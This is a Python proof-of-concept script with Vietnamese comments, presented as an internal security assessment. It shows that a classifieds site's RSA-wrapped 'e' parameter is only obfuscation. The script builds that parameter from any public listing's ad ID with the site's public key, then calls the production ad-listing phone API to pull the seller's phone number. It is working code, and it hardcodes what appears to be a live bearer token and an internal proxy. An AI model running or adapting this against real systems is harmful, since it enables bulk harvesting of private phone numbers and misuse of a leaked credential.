#!/usr/bin/env python3
"""
PoC danh gia bao mat (chay tren he thong noi bo cua chinh cong ty).
Muc tieu: chung minh tu URL detail cong khai, bat ky ai cung tu tao duoc `e`
va goi API lay so dien thoai -> lop RSA chi la obfuscation, khong phai access control.

Cai dat:  pip install cryptography requests
Chay:     python3 poc_phone.py
"""
import re
import base64
import urllib.parse
import requests
from cryptography.hazmat.primitives.serialization import load_pem_public_key
from cryptography.hazmat.primitives.asymmetric import padding

# ====================== CONFIG - sua 3 bien nay ======================
DETAIL_URL   = "https://www.chotot.com/mua-ban-dien-thoai-quan-binh-thanh-tp-ho-chi-minh/128979946.htm"
API_BASE     = "https://gateway.chotot.com"   # host that cua API (xem o tab Network, phan Request URL)
BEARER_TOKEN = "eyJhbGciOiJSUzI1NiIsImtpZCI6InB1YmxpYzpoeWRyYS5qd3QuYWNjZXNzLXRva2VuIiwidHlwIjoiSldUIn0.eyJhdWQiOltdLCJjbGllbnRfaWQiOiJjdF93ZWJfY2xpZW50IiwiZXhwIjoxNzkyNjQyMDY2LCJleHQiOnt9LCJpYXQiOjE3OTI1NTU2NjUsImlzcyI6Imh0dHA6Ly9jdC1jb3JlLWlkLnVzZXIuc3ZjLmdrZTEuY3QucHJvZC8iLCJqdGkiOiI1ODhkMmJkYS1mNWJiLTQ3NDEtYTJjMC0xOTM0YmU1Y2JmYTciLCJuYmYiOjE3OTI1NTU2NjUsInNjcCI6WyJvZmZsaW5lIiwib3BlbmlkIiwib2ZmbGluZV9hY2Nlc3MiXSwic3ViIjoiMjI5Mzc4MjcifQ.qcfmdgvskAWTzWTYIPeP6yFh3wvLNikrGk6lL--LDAJeO-Zv4_BIZavuzSvWZuxX4A59QnylQSWLmtGlrfgG0hmzataSWdOalx27qzVIfgikbUNLj5GosnBKtXLhLCyQrfhVzjk4v8e6RHqb0q2pEfxW6y2r6i5vpb3tVKYbFFrH2LETFVTouKZ4TsqXbxnCwxyxBfLYUsJUUeGXfI6jnrgnQ8THZ57kcmmM83tB7H_EFE6K80E9jdR66mP1o-4O1KtiaUNHzbkc03FIDevKvY-1p-wOJX9D3lnN9U05FJmWVU6uD2Yep8Gc9QXOxyGVpV2WkxE_T_TeC6G7trMAxSy17sKvb0i4nPoUf_BC2jX52-jdjlGnHne43YAfq2yKYwRRp-Y828nSwDcNqICA0-fHl7xI1T0vinz_b85TYPxU-cF5QgeMUwDHGwiKapv66GsTK3XI6TOKw6VcbHeykx__yH6CBfGJGwAEWXEEXuJOUfkrsDDG1s57bsMkl_tC_fJ1ubvJ1CB74O-MogGaG8E3uJ6jECZnhU30hD3pKaAujf6w-s2WrymGDNpGo-VQ5fxOFPTLbCbw_JRjLN7HFuCuxy5fkfPSs5Wgz_R3ajZlUyp0cssa1BxcYGNsMhuPLUWgd8x0HbOByOLquj6KGz637ToRNKg9bsq-V3bltnQ"       # bo trong "" neu muon thu endpoint /public/
PROXY        = "http://172.20.148.40:3128"              # proxy noi bo; de "" neu khong can
# =====================================================================

PROXIES = {"http": PROXY, "https": PROXY} if PROXY else None

# Public key production (nhat tu JS client - khong nhay cam)
PROD_PUBKEY = b"""-----BEGIN PUBLIC KEY-----
MIIBojANBgkqhkiG9w0BAQEFAAOCAY8AMIIBigKCAYEAxnvPjlA/K/adq6mA6+uU
tlyBBxFaKeK+WD2FypOeCAP0qtucmaDrIbxirykrxQjRpGxl2HKRBwGd2h/hDuk9
CxRUXD2p0Hrzb1Hb9M5px19TPXM6AWSClR1kozehRusIFrxP6PHqDLx5prJFLlSZ
zg3N3oGhS6oP/a4Ku/iAdCUCiHb5TX3b3+y4Ll/QViZhpKZjU6BhIOsiVIJhyXvn
0cSqLXPjNuXR5A4JkmRl9T9cWncEHTKmoVUyXQJaDZa3yH/OJSEmhhGyKNKkM5so
lasJWSBKenFnFvphw3+KG8BGfJwGkvtRAVbS1ljduH8z8fxALxHgUdnTtgpxB+KZ
/CVnNr97EGqYPLVlX+duGkuy1yCunqVTiY2HyL/0bMTBK84oCQjtMVAHgZ345hZn
mGST71D8+i5HGtOOFoRyP6qK6ex1qfEROzWsmVDA00aHLlQcKOLaHvT/DB30aeUs
ZoL/kQo100XccufpHESrits0mEuoyza4CCFM04F3pDOXAgMBAAE=
-----END PUBLIC KEY-----"""

_key = load_pem_public_key(PROD_PUBKEY)


def extract_ad_id(url: str) -> str:
    """Tach adId tu URL detail: .../<slug>/128979946.htm"""
    m = re.search(r"/(\d+)\.htm", url) or re.search(r"(\d{6,})", url)
    if not m:
        raise ValueError(f"Khong tim thay adId trong URL: {url}")
    return m.group(1)


def make_e(ad_id: str) -> str:
    """Tai hien JSEncrypt: RSA-3072 + PKCS#1 v1.5, base64. Chi can PUBLIC key."""
    ct = _key.encrypt(str(ad_id).encode(), padding.PKCS1v15())
    return base64.b64encode(ct).decode()


def call_phone_api(e: str, token: str) -> requests.Response:
    scope = "private" if token else "public"
    url = f"{API_BASE}/v1/{scope}/ad-listing/phone"
    headers = {}
    if token:
        headers["Authorization"] = f"Bearer {token}"
    # requests tu lo URL-encode phan `e`
    return requests.get(url, params={"e": e}, headers=headers,
                        proxies=PROXIES, timeout=15)


def main():
    ad_id = extract_ad_id(DETAIL_URL)
    e = make_e(ad_id)

    print("=" * 60)
    print(f"adId tach tu URL : {ad_id}")
    print(f"e (384 byte)     : {e[:50]}...")
    print(f"e da URL-encode  : {urllib.parse.quote(e)[:50]}...")
    print(f"Endpoint         : /v1/{'private' if BEARER_TOKEN else 'public'}/ad-listing/phone")
    print("=" * 60)

    resp = call_phone_api(e, BEARER_TOKEN)
    print(f"HTTP status      : {resp.status_code}")
    print("Response body    :")
    try:
        import json
        print(json.dumps(resp.json(), ensure_ascii=False, indent=2))
    except Exception:
        print(resp.text[:1000])

    print("=" * 60)
    if resp.ok and resp.text.strip():
        print(">> KET LUAN: Lay duoc du lieu chi bang public key + adId cong khai.")
        print(">> Lop RSA khong ngan duoc. An toan phu thuoc hoan toan vao server")
        print("   (rate limit / rang buoc phien). Xem muc khuyen nghi trong bao cao.")
    else:
        print(">> Server tu choi. Ghi lai status/headers de phan tich co che chan")
        print("   (vd token bat buoc, rate limit, kiem tra referer...).")


if __name__ == "__main__":
    main()